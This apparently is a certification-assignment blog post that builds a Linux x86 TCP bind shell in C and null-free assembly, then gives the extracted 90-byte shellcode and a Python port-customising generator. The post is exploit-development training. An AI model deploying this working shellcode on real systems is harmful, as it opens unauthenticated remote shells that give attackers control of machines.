---
layout: post
title: "TCP Bind Shell in Assembly (null-free/Linux x86)"
date: 2017-05-01 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)._
_**Student ID:** SLAE-885_
_**Assignment number:** 1_
_**Github repo:** <https://github.com/abatchy17/SLAE>_  

---
So I finished OSCP little over two months ago, took a healthy break and created a[ study plan for OSCE](http://www.abatchy.com/2017/03/osce-study-plan.html).

SLAE has been recommended by many and was the first item on the list as prep for OSCE, as well as to take some time and relax. To get the SLAE certificate you're required to solve seven assignments, this is the first one of them.  

## What are the requirements for a bind shell?

A bind shell requires the following:  

  1. Creates a listener (acts as a server) on a local port.
  2. Return a shell for an incoming connection.

---

## TCP bind shell in C

```cpp
#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int host_sockid;    // sockfd for host  
int client_sockid;  // sockfd for client  
      
struct sockaddr_in hostaddr;            // sockaddr struct  
  
int main()  
{  
    // Create socket  
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Initialize sockaddr struct to bind socket using it  
    hostaddr.sin_family = AF_INET;  
    hostaddr.sin_port = htons(1337);  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
  
    // Bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // Listen for incoming connections  
    listen(host_sockid, 2);  
  
    // Accept incoming connection, don't store data, just use the sockfd created  
    client_sockid = accept(host_sockid, NULL, NULL);  
  
    // Duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
      
    return 0;  
}  
```  

  
This code lacks error checking and shouldn't be used as is, for a more robust code, check my [sockets](https://github.com/abatchy17/sockets) repo.  
  

### Quick break down:

1\. Create socket  
2\. Bind socket to a local port  
3\. Listen for incoming connections  
4\. Accept incoming connection  
5\. Redirect `STDIN`,`STDOUT` and `STDERR` to newly created socket from client.  
6\. Spawn the shell.  
  

## Converting module to assembly

For socket programming through syscalls you'll need to make use of three
registers:  
1\. `EAX` should always contain 0x66, which is the number of `socketcall()` defined in the linux headers.  
2\. `EBX` should contain the call ID for the specific socket function you want to execute, which is defined in /usr/include/linux/net.h  
3\. `ECX` contains a pointer to the arguments.  

---

[![](http://i.imgur.com/OrTXm31.png)](http://i.imgur.com/OrTXm31.png)

```nasm
global _start  
section .text  
  
_start:  
    ; Socket functions should be accessed through socketcall()  
    ; References:  
    ;   1. http://man7.org/linux/man-pages/man2/socketcall.2.html  
    ;   2. http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210  
    ; Call ids are defined in /usr/include/linux/net.h and should be put in EBX  
  
    ;  
    ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)  
    ;  
    push byte 0x66      ; socketcall()  
    pop eax             ; EAX = 0x66  
    cdq                 ; EDX = 0x0 | Saves a byte  
    xor ebx, ebx  
    inc ebx             ; EBX = 0x1 | #define SYS_SOCKET 1  
                        ; saves a byte instead of mov bl, 1  
    push edx            ; zeroed out earlier  
                        ; protocol = 0  
    push ebx            ; SOCK_STREAM = 1  
                        ; Needed for bind(), can be used here to save a few bytes  
    push byte 0x2       ; PF_INET = 2  
    mov ecx, esp        ; ECX points to args  
    int 0x80  
  
    xchg esi, eax       ; sockfd is now stored in esi  
  
    ;  
    ; bind(sockfd, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("0.0.0.0")}, 16)  
    ;  
    push edx            ; sockaddr.sin_addr.s_addr: INADDR_ANY = 0  
    inc ebx             ; EBX = 0x2 | #define SYS_BIND 2  
    push word 0x3905    ; sockaddr.sin_port   : PORT = 1337 (big endian)  
    push bx             ; sockaddr.sin_family : AF_INET = 2  
    mov ecx, esp        ; ECX holds pointer to struct sockaddr  
  
    push byte 0x10      ; sizeof(sockaddr)  
    push ecx            ; pointer to sockaddr  
    push esi            ; sockfd  
    mov ecx, esp        ; ECX points to args  
    push byte 0x66      ; socketcall()  
    pop eax  
    int 0x80  
  
    ;  
    ; listen(sockfd, 2)  
    ;  
    push ebx            ; queueLimit = 2  
    push esi            ; sockfd stored in esi  
    mov ecx, esp        ; ECX points to args  
    push byte 0x66      ; socketcall()  
    pop eax   
    inc ebx  
    inc ebx             ; #define SYS_LISTEN 4  
    int 0x80  
      
    ;  
    ; accept(int sockfd, NULL, NULL);  
    ; From man 2 accept: When addr is NULL, nothing is filled in;   
    ; in this case, addrlen is not used, and should also be NULL.  
    ;  
    push edx            ; Push NULL  
    push edx            ; Push NULL  
    push esi            ; Push sockfd  
    mov ecx, esp        ; ECX points to args  
    inc ebx             ; #define SYS_ACCEPT 5  
    mov al, 0x66        ; socketcall()  
    int 0x80  
      
    ;  
    ; dup2(ebx, {0,1,2})  
    ;  
    xchg ebx, eax       ; EAX = 0x5, EBX = new_sockfd  
    xor ecx, ecx        ; ECX = 0  
lbl:  
    mov al, 0x3f        ; dup2()  
    int 0x80  
    inc ecx             ; Iterate over {0,1,2}  
    cmp cl, 0x4         ; Are we done?  
    jne lbl             ; Nope  
      
    ; execve("/bin//sh", NULL, NULL)  
    push edx            ; Null terminator  
    push 0x68732f2f     ; "hs//"  
    push 0x6e69622f     ; "nib/"  
      
    mov ebx, esp        ; EBX points to "/bin//sh"  
    mov ecx, edx        ; ECX = NULL  
      
    mov al, 0xb         ; execve()  
    int 0x80  
``` 

  
As you noticed, when calling `bind()`, we defined port 1337 as 0x3905 instead of 0x0539, this is because it's in network byte order, which is big-endian. In the example code you should still call htonl even if your CPU is big-endian for cross compatibility.

---

## Testing our shell

### 1\. Compile code and run

[![](http://i.imgur.com/psvbM4q.png)](http://i.imgur.com/psvbM4q.png)

### 2\. Connect to 127.0.0.1:1337
 

[![](http://i.imgur.com/XWQFHG3.png)](http://i.imgur.com/XWQFHG3.png)

---

## Extracting shellcode  

```console
abatchy@ubuntu:~/Desktop/work$ objdump -d ./bind_shell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'  
"\x6a\x66\x58\x99\x31\xdb\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x96\x52\x43\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x6a\x66\x58\xcd\x80\x53\x56\x89\xe1\x6a\x66\x58\x43\x43\xcd\x80\x52\x52\x56\x89\xe1\x43\xb0\x66\xcd\x80\x93\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80"  
```    

---

## Python wrapper

  
Simple wrapper that takes a port number between 1-65535 and spits out the shellcode that will bind on the port provided.  

```python
#!/usr/bin/python  
  
import socket  
import sys  
import struct  
  
if len(sys.argv) is not 2:  
    print "Usage: {0} PORT".format(sys.argv[0])  
    exit()  
  
port = int(sys.argv[1])  
  
if port < 1 or port > 65535:  
    print "Are you kidding?"  
    exit()  
  
if port <= 1000:  
    print "Port will bind only if run as root"  
  
# ugly code, don't look  
port = format(port, '04x')  
port = "\\x" + str(port[2:4]) + "\\x" + str(port[0:2])  
  
sc = "\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x96\\x52\\x43\\x66\\x68" + port + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x53\\x56\\x89\\xe1\\x6a\\x66\\x58\\x43\\x43\\xcd\\x80\\x52\\x52\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x93\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75\\xf6\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80"  
  
print "Shellcode generated:"  
print sc  
```    

---

## Final notes

1\. Shellcode is **null free** assuming the port number is too.  
2\. Shellcode size is **90 bytes**.  
3\. Shellcode is **register-independant**.  
  

## References:

1\. <http://man7.org/linux/man-pages/man2/socketcall.2.html>
2\. <http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210>
3\. Hacking: The Art of Exploitation (2nd Edition) - Chapter 4 and 5  
  
\- Abatchy

